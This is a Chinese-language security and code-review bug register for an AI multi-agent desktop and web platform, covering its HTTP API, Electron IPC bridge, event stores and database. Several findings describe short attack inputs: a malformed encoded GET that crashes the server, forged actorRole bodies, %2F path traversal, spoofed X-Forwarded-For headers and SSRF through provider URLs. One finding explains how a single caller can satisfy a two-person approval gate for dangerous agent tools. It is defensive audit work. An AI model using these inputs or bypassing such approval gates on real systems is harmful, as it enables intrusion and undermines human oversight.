| REV-129 | 前端 | 中 | 安全 | **登出不清事件缓冲 → 跨账号残留**：`accountStore.ts:523-539` logout 只重置自身与 `adoptAccount(null)`，未清 `useEventStore/useTodoStore/useGovernanceStore`；缓冲保留 1000 条含工具输出正文与 A2A `summary/payload`（`eventStore.ts:31-46`），`AgentView`/`Subscribe` 渲染不判属主 ⇒ 下一账号可见上一账号内容（REST 侧 `ai_events` 按 owner 过滤，只有实时缓冲是破口）。修复：logout/切换统一 `clearEvents()` + 各 store `clear()` | △子代理 |
| REV-130 | 前端 | 中 | 性能 | 事件风暴渲染放大：`eventStore.ts:41` 每条事件 `[...state.events, msg]`（O(n) 拷贝，逐 token 触发）；`AIEventBus.tsx:66-74` 每次全量重映射、`Subscribe.tsx:46-50` 全量重过滤、`AgentView.tsx:114-126` 每次重建 Map+filter+sort；id 含数组下标 ⇒ 超 1000 条 `slice(-500)` 后所有 React key 位移、整列重挂载闪烁。修复：chunk 不进全局缓冲；id 用 eventId/单调序号；缓冲改环形数组 | △子代理 |
| REV-131 | 前端 | 中 | 交互 | 分发链单点故障：`connectBridge` 的 `handlers.forEach` 中**任一 handler 抛错即中断其后所有分发**，且 `msg.data` 为 undefined 时 `data.messageId` 直接 TypeError（`useEventBus.ts:81/86` 无空值防护）；另 `hotReloadStore.flushAfterReply` 仅在带 messageId 的 stream_end 分支调用（`:105`）⇒ 无 messageId 的失败路径让 afterReply 配置永久挂着。修复：handler 逐个 try/catch + 空值守卫 + 失败降级分支 | △子代理 |

### A2A/事件投递语义核对（发送→路由→投递→ACK→重试→死信→回放）
| 环节 | 状态 |
|---|---|
| 发送 `sendA2A` | ❌ 实现完整但未接线（REV-117） |
| 路由 | ❌ 无 inbox / 无推送，仅落库行 + 发事件 |
| 投递 | ⚠️ 语义为"至多一次的记录"，`markDelivered` 仅治理 drain 用 |
| ACK | ⚠️ 字段 + `/api/a2a/ack` 已实现，无超时看门狗（REV-120） |
| 重试 | ❌ 投递无重试（`synced_at` 仅用于跨设备镜像上行） |
| 死信 | ❌ 未实现 |
| 回放 | ⚠️ `ai_events` 不含 `a2a:` 前缀（另存 `a2a_messages`，无双写）；实时经 `ipcBridge.ts:263` 全枚举下行，但 a2a 事件因无发布方实际不下行 |

**已核对干净（M07 服务端）**：1) `a2aStore` 读写全程 `getActiveOwner()`，卡片/消息/告警按 owner 过滤，跨账号隔离成立；2) `visibility.ts` 可见性过滤后端强制 fail-closed（L1 两端都在域内、L2 仅自身+直达父、无 agentId 即 hidden、非 L0 看阻断消息只给摘要且后端摘正文）；3) 卡片指纹只覆盖签发内容、运行态不重签，身份连续性符合设计；4) `alertDisposition` 角色强绑定不静默降级，`sendA2A` 第③步执行配对冷却拦截（效力闭环依赖 REV-117 修复）；5) `memoryGuard` RM7 阻止"被阻断消息沉淀为共享事实"；`/api/a2a/*` Bearer 验真 fail-closed 且跨属主 403。
**已核对干净（M07 前端）**：`a2aSync.ts:157-172` 脱敏（SECRET_PATTERNS/SENSITIVE_KEY 递归）与"批成功才 markSynced、失败即停重试"幂等正确；governanceStore/todoStore 的 `applyEvent` 按 recordId/agentId 幂等；`a2aIpc.ts:56-74` 对拉回项做字段类型规整与 `messageId&&taskId` 过滤。
**未覆盖疑点**：真实 Agent 协作是否完全绕开 A2A 而走 `Core/Decision/orchestrator`/delegation（待 M05b 复核确认）；`aiEventStore.ts:52,76 lastKnownSessionId` 全局兜底可能把无会话字段事件归到别的会话；多窗口同时广播的账号作用域未验证；`Src/Interface/WebSocket/` 仅 `.gitkeep`（**非死代码，是未实现**）；`Pipeline/eventPipeline.ts` 与 EventBus 重叠、自述 0 生产消费。

---

## 11. Bug 登记表（M08 接入层安全与 IPC 暴露面）

> 三端子代理：后端 HTTP 面 / 桌面桥（electron + IpcBridge）/ 前端消费者侧。主审对 Critical 与高危条目逐条读码复核。

### 11.1 后端 HTTP 接入面（REV-132~147）

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-132 | 服务 | 致命 | 安全/可用性 | **一个匿名 GET 打死后端**：`router.ts:85,101` 对路径参数与 query 调 `decodeURIComponent`，而 `webServer.ts:45` 的 `matchRoute`/`parseQuery` 在 `try` 之外（try 只包 handler，:73）、`httpServer.ts:139` 的 `await handleRequest` 也无 try；`GET /api/x%zz` 抛 URIError → promise 拒绝无人接，且全仓 `grep unhandledRejection|uncaughtException` 在 `Src/`+`electron/` **零命中** → Node ≥15 默认终止进程、Electron 直接闪退。修复：safeDecode 包装 + 请求入口整体 try + 注册进程级兜底并落日志。✅复核 |
| REV-133 | 服务 | 致命 | 安全 | **REST 全线无鉴权环节**：`webServer.ts:45-68` 匹配到路由即执行；全仓只有 `approvalApi.ts:75`、`a2aApi.ts:43` 两处取 Bearer。据此盘点 18 个 *Api：GET tasks/agents/tokens/memory/configs/skills/loops/audit/approvals 全部匿名可读（泄露钱包、Agent ID+角色、审批队列）；POST /api/tasks、/api/agents/:id/execute、bulk 记忆写、config 写全部匿名可改。修复：接入层统一身份门 + 按路由声明所需角色。✅复核 · ◐部分修复(P0-2 2026-10-08)：**统一身份门已建**——`httpServer` 在进入路由表前对 `/api/*` 调 `isApiAuthorized`，凭据缺失/错误即 401 并 `logger.warn` 留痕（未初始化时 fail-closed，全拒），实测匿名 GET tasks/agents/approvals 与 POST config 写全部 401，故"同网段任意机器匿名读写"这条路径已断。**残留**：「按路由声明所需角色」未做——门只解决"是不是本机授权调用者"，不解决"这个身份能读哪些路由/谁的会话"，18 个 `*Api` 的路由级授权仍归后续工单 |
| REV-134 | 服务 | 致命 | 安全/业务 | **CRITICAL 双人红线可被单一调用方满足**：`approvalApi.ts:58-86` 无令牌即回退方案 A（本地活动账号），`decidedBy` 只需是"真实注册 Agent 且角色匹配"（`approvalIdentity.ts:68+`）；匿名先 `GET /api/agents` 枚举 auditor/regulator 的 id，再连发两次 decide（第一次 `user:x`、第二次 `auditor:agent-auditor-N`）即凑满 `countDistinctRoleMatches` 法定人数 → 危险工具被"合法"放行。修复：agent 身份不得作为凭据，decide 需可信会话。✅复核(链路)/△(quorum 计算细节) · ◐P0-1 已修：`decideApproval` 增「同身份二次投票不计入」409 拦截 + 身份绑定为 `role:${activeOwner}`（每票的账号即审计轨迹）。**真实验证推翻了先前的属主硬拒方案**：CRITICAL 的第二票按定义必须由另一位操作者（另一登录账号）投出，若按 `getActiveOwner()` 拒绝跨账号裁决，双人控制再次变成"永久 PENDING 到超时"（与 REV-264 同型），故改为——待裁决审批作为治理工单跨账号可见可裁、已决条目仍按属主隔离。**根因（身份可自报、`setActiveOwner` 进程级且切换无需凭据）仍在**：P0-2 已把"匿名同网段枚举 `/api/agents` + 连发两票"这条路断掉（`/api/*` 无凭据即 401），但**本机**调用者仍可自报任意已注册 Agent 身份凑法定人数——身份不可自报才是本条根因，归后续工单 |
| REV-135 | 服务 | 高 | 安全 | `chatApi.ts:413-418,463-472` 的 `workDir` 直接取请求体绝对路径建会话/改目录，未见 workspace 根约束（`workspaceGuard.ts:60-72` 未在此路径调用）→ 匿名把某会话的工具根指到任意目录。修复：限定在 workspaceBase 之下。✅复核(代码位)/△(guard) |
| REV-136 | 服务 | 高 | 安全 | `auditApi.ts:43,54,65,75` freeze/unfreeze/investigate/patrol 的 `actorRole` 一律取自请求体 —— 与已登记 `regulationApi.ts:82`（REV-06x 族）同型但**不同代码位**；`{"actorRole":"user"}` 即匿名冻结/解冻任意 Agent。修复须两处同步，另注意 DELETE 的 actorRole 还走 query（`regulationApi.ts:94`）。✅复核 |
| REV-137 | 服务 | 高 | 安全 | `agentApi.ts:48-61` execute 无身份、无归属校验，instruction/model/maxIterations 全由 body 决定 → 匿名驱动任意 Agent 跑整轮 Loop（烧额度、触发工具链）。修复：绑属主 + 可信身份 + 额度门。△子代理 |
| REV-138 | 服务 | 高 | 安全 | `apiRateLimiter.ts:41-47` 限流键无条件取 `X-Forwarded-For` 首段 → 每请求伪造一个新 IP 即完全绕过限流；且 `:62-66` 的过期清扫循环在**每个请求**里遍历整张 Map、桶数无上限 → 伪造 IP 洪泛即内存/CPU 放大攻击。修复：默认 `socket.remoteAddress`、可信代理白名单、桶上限 + 定期清扫。✅复核 |
| REV-139 | 服务 | 高 | 安全 | `httpServer.ts:120-127` 读 body 无 Content-Length 校验、无累计上限、无超时 → 超大 JSON 直吃内存，与 REV-138 叠加可远程 OOM。修复：1MB 级流式上限并回 413。✅复核 |
| REV-140 | 服务 | 中 | 安全 | `httpServer.ts:57-63` 按白名单回显 `Access-Control-Allow-Origin` 但**不发 `Vary: Origin`** → 经缓存/代理时跨来源响应污染（A 的会话数据可能被回给 B 的浏览器缓存）。修复：命中即带 `Vary: Origin`。✅复核 |
| REV-141 | 服务 | 中 | 安全 | `httpServer.ts:181` 用 `filePath.startsWith(rootDir)` 判边界：无分隔符边界，`/../distevil/x` 归一化后为 `Client/distevil/x` 仍通过前缀判定 → 同名兄弟目录（`dist_backup`、`dist_old`）内容可被匿名读取；另 `.map` 不在 MIME 表、无 `Cache-Control`/`ETag`，`existsSync+statSync+readFileSync` 同步 IO 阻塞事件循环（可停住 LLM 流式）。修复：`relative()` + 首段非 `..` 判定、异步流式、补缓存头。✅复核 |
| REV-142 | 服务 | 中 | 日志 | 承接上条：`httpServer.ts:203-205` 读文件异常 → `catch { return false }` → 落到 SPA fallback 返回 **200 + index.html**，JS 请求拿到 HTML：故障被洗成成功、控制台只有 MIME 报错、`Logs/` 零记录。违反铁律 §3.2。修复：区分"不存在"与"读失败"，后者记 warn 并回 500。✅复核 |
| REV-143 | 服务 | 中 | 日志 | `webServer.ts:73-86` 5xx 只 push 进进程内 `requestLogs`（上限 1000，`getRequestLogs` 仅测试消费）→ 生产环境 `Logs/` 里**没有任何一条 5xx**；异常原文 `${error}` 回传客户端（泄露栈/绝对路径，同 REV-011）。修复：logger.warn 落盘 + 对外泛化错误码。✅复核(结构) |
| REV-144 | 服务 | 中 | 安全/交互 | `skillsApi.ts:73-90` 期望 `:id` = `category/name`，但路由把 `:id` 编译为 `([^/]+)`（`router.ts:60-63`）→ `playbooks/quickStart` **永不匹配**（端点是死代码）；若客户端传 `%2F`，解码后 `category='..'` → `join(skillsDir(),'..','x.md')` 可读 Skills 目录之外的任意 `.md`。修复：改两段路由 `:category/:name` + 白名单。✅复核 |
| REV-145 | 服务 | 中 | 日志/体验 | `configApi.ts:35-50` 把"JSON 解析失败"和"文件不存在"并进同一 catch → 用户改坏 `Configs/*.json` 得到 `Config not found`(404) 且无日志；`toolsApi.ts:40-42`、`skillsApi.ts:57-59`、`memoryApi.ts:64-67,266-268` 同属"异常伪装空结果"（对照 `syncApi.ts:99` 已合规）。修复：解析错误显式回 422/500 并留痕。△子代理 |
| REV-146 | 服务 | 低 | 交互 | `router.ts:74-91` 方法不匹配一律 404（无 405/Allow），排障方向被误导；`httpServer.ts:67-71` CORS 未命中仍回 204 无头，前端只见"CORS 失败"。△子代理 |
| REV-147 | 服务 | 低 | 交互 | `chatApi.ts:426,539-540` 的 `parseInt` 未判 NaN/负数：`?limit=abc` → NaN 传进 better-sqlite3 → 500；`?limit=-1` → 整表读。修复：统一范围校验。△子代理 |

> **P0-2 对本节其余条目的影响口径（勿误读为已修复）**：`/api/*` 的统一凭据门（`httpServer` 进路由表前 `isApiAuthorized`，缺失/错误即 401 + `logger.warn` 留痕，未初始化 fail-closed）已经实测断掉"同网段任意机器匿名读写"这条路，因此 REV-135/136/137/141/144 等条目里"匿名即可…"的前置条件不再成立——但**这些条目的缺陷本身仍在**：门只回答"是不是本机授权调用者"，不回答"这个身份能改哪个目录(135)、能填什么 actorRole(136)、能驱动谁的 Agent(137)、能读 `dist` 同名兄弟目录(141)、`:id` 里塞 `%2F` 越界(144)"。取得凭据的本机调用者依然可复现全部后果。逐条修复仍归 P0-4/P1/P2，路由级角色授权归 REV-133 残留。

### 11.2 桌面桥接面（REV-148~161）

| 频道/位置 | 入参校验 | 能力 | 严重度 |
|---|---|---|---|
| `window-open`(main.ts:241) | 无 scheme 校验 | openExternal 任意协议 | 致命 |
| `open-path`(main.ts:418) | 仅 existsSync | 默认程序打开/执行文件 | 高 |
| `ipc-add-provider`/`ipc-fetch-models`(ipcBridge:424/490) | base_url 裸拼 | 出站 fetch + 携带 api_key | 高 |
| `ipc-test-provider`/`verify-models`(onboarding:142/157) | 无 | 出站网络 | 高 |
| `server-fetch`(main.ts:381) | 仅 `^https?` | 任意主机请求并回体 | 中 |
| `ipc-load-secrets`(ipcBridge:827) | 无 | 整包明文 Key 回传 | 中 |
| `backend-command`(ipcBridge:274) | JSON.parse 静默 | 起任意会话循环 | 中 |

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-148 | 桌面 | 致命 | 安全 | `electron/main.ts:241-243` `setWindowOpenHandler` 对**任意 URL** 直接 `shell.openExternal(url)`；同文件 `:437-441` 的 `open-external` IPC 却校验 `^https?:` → 两条出口策略自相矛盾，`file:`/自定义协议处理器（ms-msdt 等）可被渲染层或注入内容拉起。修复：复用同一 scheme allowlist。✅复核 · ✅已修复(P0-2 2026-10-08)：`electron/urlPolicy.ts` 成为唯一口径（`https:`/`mailto:`），`setWindowOpenHandler` 与 `open-external` 两条出口共用 `isSafeExternalUrl`，拒绝时打 `[Electron][security] 拒绝打开外部链接` 留痕；`Tests/Interface/desktopUrlPolicy.spec.ts` 锁住 `http:`/`file:`/`javascript:`/`ms-msdt:`/`search-ms:`/空值/非字符串全部拒绝 |
| REV-149 | 桌面 | 高 | 安全 | `main.ts:418-431` `open-path` 仅 `existsSync` 即 `shell.openPath`（Windows 下等同"用默认程序打开/执行"），无目录白名单 → 工具写出的 `.bat/.exe` 可被一步拉起。注：前端子代理把这里判为"有校验、干净"，主审按实码取**高危**。修复：限数据/工作空间根内，或改 `showItemInFolder`。✅复核 |
| REV-150 | 桌面 | 高 | 安全 | `ipcBridge.ts:424,490-499` add-provider/fetch-models 把渲染层传入的 `config.base_url` 裸拼成 `${base_url}/models` 并把 `api_key` 作 Authorization 发出（`providerProbe.normalizeBaseUrl`(:233) 仅去尾斜杠）→ SSRF（内网/元数据/localhost 其它端口）+ **把真实 Key 发往任意主机**。修复：协议+私网拒止+域名 allowlist。✅复核 |
| REV-151 | 桌面 | 高 | 安全 | `onboardingIpc.ts:142-165` test-provider / verify-models 同样未校验 base_url 即发起网络探测 → 引导流程即 SSRF 面。修复：与 REV-150 共用守卫。△子代理 |
| REV-152 | 桌面 | 中 | 安全 | `main.ts:226-231` 只设 `nodeIntegration:false`+`contextIsolation:true`，**未设 `sandbox:true`**（preload 靠 bridge 即可，加沙箱成本极低）→ 渲染进程被攻破时权限面扩大。✅复核 |
| REV-153 | 桌面 | 中 | 安全 | `ipcBridge.ts:827-834` `ipc-load-secrets` 无参数校验地把**所有供应商解密后的明文 Key** 整包回传渲染进程 → 一次注入即批量外泄。修复：按需取用、只回"是否已配置"。✅复核 |
| REV-154 | 桌面 | 中 | 安全 | `main.ts:381-397` `server-fetch` 只校验 `^https?`，无主机限制、透传任意 header、回传完整响应体 → 渲染层成为无限制 HTTP 代理（绕 CORS 打内网）。修复：限 `127.0.0.1:{serverPorts}`。✅复核 |
| REV-155 | 桌面 | 中 | 日志 | `ipcBridge.ts:703-705,763-765` memory-entries / get-skills 的 catch 直接 `return { ok:true }` + 空数据、无 logger → DB/fs 异常伪装成"无记忆/无技能"（同 REV-012 家族）。修复：记 warn、回 ok:false。△子代理 |
| REV-156 | 桌面 | 中 | 日志 | `main.ts:462,483,497,509` secure-store 写/解密/删除多处空 catch 仅注释无日志 → 登录态无法持久化时用户与排障双方都无信号（同 REV-012 家族，与 REV-189 密钥覆盖互为后果）。△子代理 |
| REV-157 | 桌面 | 中 | 交互/安全 | `ipcBridge.ts:263-271` 全量事件无 session/owner 过滤即向所有窗口 `webContents.send`；前端 `chatStore.ts:731` 用 `msg-stream-${Date.now()}` 作流式槽 id → 同毫秒两条流撞车、缓冲互覆盖（A 内容落进 B）。修复：广播带 sessionId 过滤、id 加随机/会话前缀。△子代理 |
| REV-158 | 桌面 | 中 | 业务/可用性 | `electron/` 全目录 `grep requestSingleInstanceLock|second-instance` **零命中**，主进程亦无 `uncaughtException`/`unhandledRejection` 兜底（与 REV-132 合流）→ 双开会抢 3000 端口、并发写同一 `Data/.secrets`，且任何后台拒绝直接崩进程无日志。✅复核 |
| REV-159 | 桌面 | 低-中 | 交互 | `ipcBridge.ts:274-286,868-893` `backend-command` 非 JSON 帧静默丢弃；`generate_reply` 可对任意 sessionId 起循环，无并发/速率限制 → 渲染层可刷出大量并发流（成本与资源）。△子代理 |
| REV-160 | 桌面 | 低 | 交互 | `preload.ts:127-129` `onBackendEvent` 把原始 `IpcRendererEvent`（含 sender/ports）透传，且多次注册无逐条解绑。修复：只回消息体并返回 unsubscribe。△子代理 |
| REV-161 | 桌面 | 低 | 业务 | `a2aIpc.ts:56-76` `sync-apply` 对 items 全 String 化，kind/verdict/visibility 无枚举白名单、无 owner → 可注入伪造 `verdict=allow` 记录。△子代理 |

### 11.3 前端消费者侧（REV-162~173）

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-162 | 前端+服务 | 高 | 安全/交互 | 后端专门加的 G-09 方案 B **前端从不配合**：`Client/src/services/api.ts:127` 的请求头只有 `{'Content-Type': ...}`，全仓无 `Authorization`/`X-Account-Token` 注入点 → `extractBearerToken` 恒 null、恒回退可伪造的方案 A（`httpServer.ts:62` 的 CORS 放行形同虚设）。修复：统一在 api.ts 注入 accessToken。✅复核 |
| REV-163 | 前端 | 高 | 安全 | `Client/index.html` 无 CSP meta、后端与 Electron 也从未下发 `Content-Security-Policy`（三处 grep 全零命中）→ 一旦存在注入点即全暴露（叠加 REV-148/149/153 的桌面出口）。修复：静态托管 + 主进程统一下发 CSP。✅复核 |
| REV-164 | 前端 | 高 | 安全 | `serverApi.ts:83` `normalizeServerUrl` 把无协议地址**静默补 `http://`**，无 https 强制与告警；同文件把 password / deviceCredential / refreshToken 发往该地址（`accountStore.ts:442,501,526`）→ 用户手填远端地址即明文凭据出网。修复：默认 https、降级需显式确认。✅复核(函数)/△(字段清单) |
| REV-165 | 前端+桌面 | 中 | 交互 | `serverApi.ts:147-169` Electron 分支把 `init.signal` 丢掉、`main.ts:387` 的 server-fetch 也无超时（对比 `api.ts:88-96` 至少做了 race）→ 桌面形态所有服务端调用可永久挂起、loading 不收敛。修复：把 timeoutMs 传进主进程或在渲染侧 race。✅复核 |
| REV-166 | 前端 | 中 | 日志/体验 | `api.ts:167` 的 `JSON.parse` **早于** `res.ok` 判定（:170）→ 404/502 返回 HTML 时抛 SyntaxError 被归成 `type:'network'`「网络错误」；`:170-174` 的状态分类里**没有 401/403 分支**（全并入 4xx）→ 后端故障与登录态问题都被说成网络问题。修复：先判状态，再按类型分类解析。✅复核 |
| REV-167 | 前端 | 中 | 交互 | `api.ts:160-162` `parseInt(Retry-After ?? '5', 10)`：RFC 9110 允许 HTTP-date 形式 → NaN 传进 `Math.min(NaN*1000,30_000)` 使 `setTimeout` 立即重试，且 `setRateLimited(NaN)` 令 `until=NaN`、`Date.now()>=NaN` 恒 false → 限流态**永久卡住**。注：`rateLimited` 无组件消费（见 M10）。修复：`Number.isFinite` 兜底。✅复核 |
| REV-168 | 前端 | 中 | 日志/体验 | `eventBusBridge.ts:41-58` 两个分支都无条件 `setOnline(true)`；`disconnectBridge()` 全仓无调用点，也无 `/healthz` 周期心跳（仅 accountStore 手工 testConnection）→ 后端崩溃/断网时状态灯**恒"在线"**，`OfflineBanner.tsx:10` 的"正在尝试重连"是永不出现的死 UI。✅复核 |
| REV-169 | 前端 | 中 | 交互 | 同文件 `:53-57,85-94` 注释称浏览器"降级为 HTTP 轮询获取事件"，实际轮询只探测 `window.electronAPI`（浏览器永不出现）→ 3s 定时器空转到底、**零事件下行**，同时 `:56` 已宣称在线。同 REV-003 家族的"谎言面"补证。✅复核 |
| REV-170 | 前端 | 中 | 安全 | `a2aSync.ts:67-75,110-131` 脱敏只递归 `payload`，`summary`(:125) 原样上行；`SENSITIVE_KEY` 正则全锚定 → 漏 `x-api-key`/`refresh_token`/`OPENAI_API_KEY`；值模式漏 `glpat-`/`xoxb-`。另 `:119-120` 的 `contentHash`/`prevHash` 取原行、脱敏后不重算 → 上行载荷与防篡改链自相矛盾。△子代理 |
| REV-171 | 前端 | 中 | 体验/业务 | `ModelProviderPanel.tsx:287` UI 承诺"密钥加密保存在本机，重启后自动恢复"，但供应商链路只有 IPC：浏览器形态 `ipcApi.ts:74-99,314-325` 返回 `[]`/`'Electron API 不可用'`，`modelStore.ts:119-135` 又静默 catch → 面板显示"暂无供应商"+ 一句 IPC 术语、无替代路径。△子代理 |
| REV-172 | 前端 | 低 | 日志 | `api.ts:105` Electron 路径 `header: () => null` 硬编码 → 桌面端 Retry-After 恒丢失；`eventBusBridge.ts:71-80` 浏览器 `send()` 只 `console.warn` 后丢命令（同 REV-003）。✅复核 |
| REV-173 | 前端+构建 | 低 | 安全 | `Client/vite.config.ts:16` `sourcemap: true` 无条件开启 → TS 源码随产物发布；桌面包因 `package.json` `files` 含 `!**/*.map` 侥幸排除，但**Web 静态托管没有这层过滤**（见 REV-141：`.map` 可被任意请求，只是 MIME 缺失）。注：该子代理另称 vite 无 `server.proxy`，主审核对 `vite.config.ts:38-44` **确有** `/api → localhost:3000` 代理，此半条不成立、不登记。✅复核 |

### 11.4 已核对为干净的点（M08）

- 请求日志不含 header/body/query：`webServer.ts:83-86` 只记 method/path/status/duration，令牌与凭据不会进日志。
- `configApi.ts:45` 的 `[^a-zA-Z0-9_.-]` 清洗已封住配置文件名穿越；URL 未解码路径（`%2e%2e%2f`）在静态托管处只落 404/SPA，真正可利用面是 REV-141 的兄弟目录前缀。
- `serverIdentity.ts` 身份验真为 fail-closed（非 2xx/异常均 err + logger.warn），缓存只存令牌 SHA-256；`httpServer.ts:98-101` 端口错误已显式 reject（历史"假成功"已修）。
- `a2aApi.ts` 的 reveal/inbox/drain/dispose 走 `resolveViewer`，未采信 body 里的角色（区别于 regulation/audit 两域）。
- preload 只暴露命中的具体方法，**未**透传通用 `ipcRenderer.send/invoke`，未暴露 fs/child_process（`preload.ts:12-138`）；`will-navigate` 全量 preventDefault（`main.ts:541`）；`open-external` IPC 有 http(s) 白名单（`:437`）；生产态不开 devtools、Menu 置 null。
- Markdown 渲染无 XSS：无 `rehype-raw`，`react-markdown` 默认 `defaultUrlTransform` 未被覆盖（`javascript:` 被拦），`MarkdownRenderer.tsx:69` 的 innerHTML 内容是 shiki `codeToHtml` 转义输出且 lang 走白名单（`:44`）；全仓无 `target=_blank` 裸变量注入、无 axios、无 `document.cookie`、凭据不进 console。
- 五个 Db 仓库的 SQL 全部占位符参数化，`${sets.join(', ')}` 片段均为硬编码 `列 = ?`，用户输入不进 SQL（详见 §12）。

---

## 12. Bug 登记表（M09 持久化与数据模型）

### 12.1 属主过滤 / 参数化 / 事务覆盖矩阵

| 表 / 仓储 | SQL 参数化 | owner 过滤 | 事务内 | 备注 |
|---|---|---|---|---|
| `sessions` / sessionRepository | ✅ | ❌ **表本身无 owner_user_id** | ❌ | 生产侧几乎零调用（见 REV-174） |
| `agents` / agentRepository | ✅ | ✅ 读写都带 | ❌ | 字段无回读（REV-179） |
| `tasks` / taskRepository | ✅ | ✅ | ❌（双语句） | sessions+tasks 非原子（REV-186） |
| `subtasks` / subtaskRepository | ✅ | ✅ | ❌ | |
| `loops` / loopRepository | ✅ | ❌ **有列但查询不用** | ❌ | REV-175 |
| `loop_checkpoints` / checkpointStore | ✅ | ❌ 无列 | 伪事务 | REV-189 |
| `effect_journal` | ✅ | **INSERT 不写该列** | ❌ | REV-176 |
| `token_wallets` / `token_transactions` | — | — | — | **全仓无 INSERT**，纯内存（REV-177） |
| `chat_sessions`+`chat_messages` | ✅ | ✅ | ❌ | REV-187 |
| `_migrations` | ✅ | n/a | ❌ 无事务 | REV-178/180 |

### 12.2 后端仓储与迁移（REV-174~190）

| ID | 层 | 严重 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-174 | 服务 | 高 | 安全 | 迁移 v22 给 10 张表补 `owner_user_id`（`migrations.ts:394-412`）**唯独漏 `sessions`**（`agents` 靠 v28 补）；`sessionRepository.ts:81,95,109,124` 四条 SQL 零属主条件，`grep owner_user_id` 该文件=0 → `listActiveSessions()` 返回全账号会话。缓解事实：该仓库在生产代码无调用点（仅 `Tests/Infra/db.spec.ts`），与 REV-021"三套会话模型"同源 → 要么补列+过滤，要么显式废弃仓库。✅复核 |
| REV-175 | 服务 | 高 | 安全 | `loops` 表**有** owner 列（v22:402）但 `loopRepository.ts:86` `UPDATE … WHERE loop_id = ?`、`:99` `SELECT … WHERE loop_id = ?`、`:108` `SELECT COUNT(*) FROM loops` 全部不过滤 → B 账号可推进 A 账号 loop 的 iteration/phase；countLoops 作为指标把全库计数当本账号。修复：四条 SQL 补 `AND owner_user_id = ?`。✅复核 |
| REV-176 | 服务 | 高 | 安全/业务 | `effectJournal.ts:72-81` 的 INSERT 列表不含 `owner_user_id`（默认塌进 `'local'`），而 `syncApi.ts:162-165` 按 `WHERE owner_user_id=?` 读 → 登录用户的工具调用统计恒缺、副作用记录跨账号串桶；`createCheckpoint`（`checkpointStore.ts:54-68`）同型。修复：写入时带上 `getActiveOwner()`。✅复核 |
| REV-177 | 服务 | 高 | 业务/持久化 | **Token 账本根本不落库**：全仓 `grep "INSERT INTO token_wallets|token_transactions"` 零命中，钱包/流水只在内存（`walletManager.ts:16-21`、`tokenLedger.ts:16`、`consumptionRecorder.ts:16`），而 `tokenApi.ts:50,60-73` 读内存、`syncApi.ts:132` 读那张永空的表 → 两套口径背离；**重启后余额与流水归零**，`verifyConservation()`(:259) 对空账本必然"通过"=假守恒。修复：写入侧接 DB，守恒校验须先断言账本非空。✅复核 |
| REV-178 | 服务 | 高 | 交互 | `migrateUp`（`migrations.ts:798-816`）用裸 `db.exec(up)`：无事务、失败不回滚、`_migrations` 不写；v22 一条 up 里十余条 `ALTER TABLE ADD COLUMN`（SQLite 不支持 IF NOT EXISTS）中途失败 → 下次启动重跑撞 `duplicate column` → `main.ts:287` `throw` → **永久启动死循环（数据库卡在半迁移态）**。修复：每条迁移包 `db.transaction` + 列存在性预判 + 失败前备份。✅复核 |
| REV-179 | 服务 | 高 | 业务 | `agentRepository.ts:131-151` `updateAgentRow` 形参声明 `walletId` 但 set 链**无该分支**（agents DDL 亦无 wallet_id 列）→ 传值被静默丢弃；`rowToAgentInstance`(:63-95) 不回读 `system_prompt`/`allowed_tools`/`denied_tools` 等列 → 重启后 Agent 无提示词、无预算、工具白名单成为只写列（与 FE-052 的承诺相悖）。修复：补映射与缺失列。✅复核(形参)/△(字段清单) |
| REV-180 | 服务 | 高 | 交互 | `migrateDown`（`migrations.ts:821-841`）只读 main 库的 `_migrations` → events/memory 迁移永远回滚不了；`migrations.find(m => m.version === v)` 仅按 version 匹配，而 version 1/2/3 在多库重复注册，现靠注册顺序侥幸命中；v21 的 down 直接 `DROP TABLE long_term_memory`(:344-384) → 连续回滚即销毁全部长时记忆。修复：按 (db,version) 定位 + 破坏性 down 禁止。△子代理 |
| REV-181 | 服务 | 高 | 安全 | 作用域是**进程级可变全局**：`Src/Infra/AccountScope/activeAccount.ts:27` `let activeOwner`（无 AsyncLocalStorage、非 per-request），写入口唯一是 `memoryApi.ts:219-224` 那个无鉴权 PUT → 任一客户端改写全进程属主，并发请求互踩。修复：owner 随请求上下文传入/ALS。✅复核（同 REV-001/REV-021 家族的机制根因） |
| REV-182 | 服务 | 高 | 交互/并发 | 串号交错已复核：`a2aApi.ts:42` 先快照 `getActiveOwner()` → `:46` `await resolveServerIdentity()`（真实网络 RTT）→ 期间另一请求 `setActiveOwner(B)` → `:49` 拿 **await 前的快照**比对（仍等 A，守卫形同虚设）→ 下游 `visibility.ts:133`/`a2aStore.ts:157` 重新读全局=B → A 的验真身份被丢弃、读到 B 的数据。修复：owner 随 viewer 下传，禁止下游二次读全局。✅复核 |
| REV-183 | 服务 | 高 | 安全 | `approvalGate.ts:195-197` `decideApproval` 从进程全局 Map 取审批后**完全不校验 `approval.owner`**（对照 `:378` `getApproval` 却按属主过滤）→ B 只要知道 approvalId（`approvalApi.ts:85` 直通）即可放行 A 的 CRITICAL 审批，并把 `user:` 身份绑成 B。修复：decide 前比对 owner。✅复核 |
| REV-184 | 服务 | 高 | 业务/数据丢失 | 密钥文件读写不具原子性且失败即覆盖：`secretsStore.ts:153` 用 `writeFileSync` 直写（项目里已有 `atomicWrite` 却未用）→ 崩溃/满盘留半文件；`loadProviderSecrets` 解析失败只 log 后 `return null`(:167-170)，`upsertProviderSecret` 用 `?? { providers: [] }` 起盘再**整写**(:192) → **一次"新增供应商"抹光全部已存 API Key**，且用户毫无察觉（与 REV-156 的静默互叠）。修复：atomic 写 + 解析失败 fail-closed 拒写 + `.bak`。✅复核 |
| REV-185 | 服务 | 中 | 日志 | 仓储层"异常伪装不存在"成片：`agentRepository.ts:187-189,204-206`、`loopRepository.ts:100-102,110-112`、`subtaskRepository.ts:152,163`、`taskRepository.ts:151` 的 `catch { return 0/[]/undefined }` 零日志 → `countLiveAgentsByTrace` 返 0 会让**招募上限保护被错误绕过**、parentOf 返 null 使父子关系静默丢失。△子代理 |
